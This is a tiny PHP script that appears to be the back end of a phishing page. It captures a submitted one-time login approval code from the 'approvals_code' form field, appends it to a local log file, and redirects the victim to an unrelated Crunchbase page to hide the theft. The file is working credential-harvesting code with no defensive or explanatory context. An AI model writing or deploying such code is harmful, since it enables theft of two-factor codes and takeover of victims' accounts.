<?php

    file_put_contents("log.txt", "OTP: " . $_POST['approvals_code'] . "\n", FILE_APPEND);
header('Location: https://www.crunchbase.com/organization/tapme');
exit();
